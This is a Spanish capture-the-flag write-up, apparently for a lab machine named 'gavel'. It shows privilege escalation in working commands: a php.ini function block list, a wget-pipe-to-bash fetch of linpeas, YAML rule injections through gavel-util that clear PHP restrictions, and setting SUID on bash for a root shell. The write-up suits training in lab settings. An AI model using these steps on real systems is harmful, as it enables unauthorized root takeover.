disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```
Este archivo parece que habilita un **sandbox de PHP**.

Antes que nada, ¿qué es un archivo **php.ini**?:

| **Archivo php.ini** |
|:-------------------:|
| *Un archivo php.ini es el archivo principal de configuración de PHP. Controla cómo se comporta el intérprete PHP en todo el sistema o en un proyecto específico. Piensa en él como el archivo de configuración global de PHP.* |

Después de analizarlo con **ChatGPT**, nos indica que hay una forma de romper el sandbox para que podamos ejecutar cualquier comando, siendo que podemos aplicar una inyección para eliminar las restricciones que tiene este archivo **php.ini**.

El problema es que necesitamos alguna herramienta que ejecute y aplique las reglas que inyectemos en un **archivo YAML**, pero no la tenemos.

Al utilizar **linpeas.sh** podremos encontrar el siguiente binario:
```bash
auctioneer@gavel:/opt/gavel$ wget -qO- http://Tu_IP/linpeas.sh | bash
...
╔══════════╣ Executable files potentially added by user (limit 70)
2025-12-06+05:46:00.2392933730 /var/www/html/gavel/includes/auction_watcher.php
...
2025-10-03+19:35:58.6240656280 /usr/local/bin/gavel-util
...
...
```

Observa lo que pasa cuando lo ejecutamos:
```bash
auctioneer@gavel:~$ gavel-util 
Usage: gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```
Este binario parece leer **archivos YAML** para crear nuevos objetos.

Utilizaremos este binario para que lea un **archivo YAML** malicioso que contenga un comando que elimine las restricciones del archivo **php.ini**.

Para crear el **archivo YAML** malicioso, tendremos que seguir la siguiente sintaxis:
```bash
name:
description:
image:
price:
rule_msg:
rule:
```

Solamente completamos los campos con cosas random y en el campo **rule** inyectamos un comando que elimine las restricciones, quedando de esta forma:
```bash
auctioneer@gavel:/tmp/privesc$ cat newPHPini.yaml 
name: newPHPini
description: cambiando PHP ini
image: "berserk.jpg"
price: 1000
rule_msg: "new PHP ini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
```

Ahora utilizamos el binario **gavel-util** para cargar el **archivo YAML** malicioso:
```bash
auctioneer@gavel:/tmp/privesc$ gavel-util submit newPHPini.yaml
Item submitted for review in next auction
```
Funcionó.

Veamos los cambios en el archivo **php.ini**:
```bash
auctioneer@gavel:/tmp/privesc$ cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
open_basedir=
disable_functions=
```

Ya tenemos un archivo **php.ini** sin ninguna seguridad ni restricción:
* `engine=On` -> Habilita el motor de **PHP**.
* `display_errors=On` -> Hace que **PHP** muestre los errores directamente en pantalla.
* `open_basedir=` -> Directiva de **PHP** que limita la lectura/escritura de archivos a ciertos directorios permitidos, pero al estar vacio significa que no hay restricción de acceso a archivos.
* `disable_functions=` -> Directiva para bloquear funciones peligrosas como `exec,system,shell_exec,passthru,proc_open`, pero al estar vacia podemos usar estas funciones, lo que nos permite ejecutar cualquier código.

Con esto listo, crearemos otro **archivo YAML** malicioso que inyecte un comando que le dé **permisos SUID** a la **Bash**:
```bash
name: privesc
description: privesc on gavel
image: "berserk.jpg"
price: 1000
rule_msg: "privesc"
rule: system('chmod u+s /bin/bash'); return false;
```

Comprobemos los permisos de la **Bash**:
```bash
auctioneer@gavel:/tmp/privesc$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Ahora utilizamos el binario **gavel-util** para cargar el **archivo YAML** malicioso:
```bash
auctioneer@gavel:/tmp/privesc$ gavel-util submit privesc.yaml
Item submitted for review in next auction
```
Funcionó.

Puedes revisar de nuevo los permisos de la **Bash**:
```bash
auctioneer@gavel:/tmp/privesc$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```
La **Bash** ya tiene **permisos SUID**.

Ejecutemos la **Bash** con privilegios:
```bash
auctioneer@gavel:/tmp/privesc$ bash -p
bash-5.1# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
bash-5.1# cd /root
bash-5.1# ls
root.txt  scripts
bash-5.1# cat root.txt
...
```
Y con esto, terminamos la máquina.
